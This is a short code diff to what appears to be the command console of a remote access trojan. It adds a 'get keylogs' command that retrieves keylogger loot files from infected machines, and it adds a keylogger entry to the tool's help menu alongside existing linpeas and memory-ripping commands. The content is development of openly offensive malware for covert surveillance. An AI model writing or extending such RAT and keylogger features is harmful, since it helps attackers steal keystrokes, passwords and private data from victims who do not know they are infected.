@@ -139,7 +139,12 @@ def filterCommand(command):
     elif command == "linpeas":
         stop = True
         send(command)
-        recvFiles("linPEAS", ".txt")    
+        recvFiles("linPEAS", ".txt")
+    elif command == "get keylogs":
+        stop = True
+        send(command)
+        recvFiles("keyloggerLoot",".txt")    
+        
     elif command == "memory ripper":
         if (confirmation(command)):
             send(command)
@@ -173,6 +178,9 @@ def helpPrinter():
 
     > HIBERNATE RAT
         - hibernate-10 (hibernates the RAT 10 seconds)
+        
+    > KEYLOGGER
+        - get keylogs
     """)
 
 if __name__ == '__main__':
